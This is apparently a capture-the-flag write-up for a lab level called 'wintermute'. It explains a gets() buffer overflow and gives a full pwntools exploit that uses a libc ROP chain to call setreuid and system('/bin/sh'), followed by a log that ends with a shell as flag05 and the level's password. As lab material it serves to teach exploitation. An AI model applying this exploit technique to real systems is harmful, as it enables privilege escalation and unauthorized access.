Analyzing the source code reveals that the matrix calculations and node weight logic are distractions; the actual vulnerability lies in the unsafe use of `gets()` inside `run_query()`:

```c
static void run_query(void)
{
    char query[QUERY_SIZE];
    unsigned int h;

    printf("[WINTERMUTE] Query: ");
    fflush(stdout);

    gets(query);

    h = hash_query(query, strlen(query));
    process_matrix(h);

    printf("[WINTERMUTE] Hash: %08x\n", h);
    printf("[WINTERMUTE] Matrix[0][0]: %08x\n", matrix[0][0]);

    for (unsigned int i = 0; i < NODE_COUNT; i++) {
        if (nodes[i].active)
            printf("[WINTERMUTE] Node %s weight=%u\n",
                nodes[i].label, nodes[i].weight);
    }
}

```

Since `gets()` performs no bounds checking, we can write past the `query` buffer and overwrite the saved return address (`RIP`) at an offset of 120 bytes.

With NX enabled, we construct a direct ROP chain using gadgets from `libc` to escalate privileges and spawn an interactive shell:

1. **`setreuid(1022, 1022)`**: Sets both real and effective UIDs to `flag05` (`UID: 1022`).
2. **`system("/bin/sh")`**: Executes a shell with target privileges, using the static `/bin/sh` string reference in `libc`.
3. **`exit(3)`**: Ensures clean exit handling.

**`exploit.py`:**

```python
from pwn import *
import sys

libc = 0x7ffff7c00000

# ROP Gadgets
ROP_RDI      = p64(libc + 0x000000000010c08d)  # pop rdi ; ret
ROP_RSI      = p64(libc + 0x0000000000110b7d)  # pop rsi ; ret
ROP_RET      = p64(libc + 0x000000000002882f)  # ret (16-byte stack alignment)

# Functions & Strings
ROP_SH       = p64(libc + 0x00000000001cb42f)  # "/bin/sh" string
ROP_SYS      = p64(libc + 0x0000000000058750)  # system()
ROP_SETREUID = p64(libc + 0x00000000001271d0)  # setreuid()
ROP_EXIT     = p64(libc + 0x0000000000047ba0)  # exit()

OWNER_UID    = p64(1022)  # flag05 UID
offset       = 120

# Construct ROP chain
rop_chain  = ROP_RDI + OWNER_UID + ROP_RSI + OWNER_UID + ROP_SETREUID
rop_chain += ROP_RDI + ROP_SH + ROP_SYS
rop_chain += ROP_RDI + p64(3) + ROP_EXIT

p = process("/home/level05/wintermute", env={})
p.recvuntil(b"[WINTERMUTE] Query: ")

payload = b'\x00' * offset + rop_chain
p.sendline(payload)
p.interactive()

```

**Execution & Flag Capture:**

```sh
level05@rainfall:~$ python3 exploit.py 
[+] Starting local process '/home/level05/wintermute': pid 1681
[*] Switching to interactive mode
[WINTERMUTE] Hash: deadbeef
[WINTERMUTE] Matrix[0][0]: deadbef5
[WINTERMUTE] Node N000 weight=3
[WINTERMUTE] Node N002 weight=17
[WINTERMUTE] Node N004 weight=31
$ whoami
flag05
$ cat /home/flag05/.pass
67aaawdq0zcaaf3x57yh6irhvyjv3vs5
```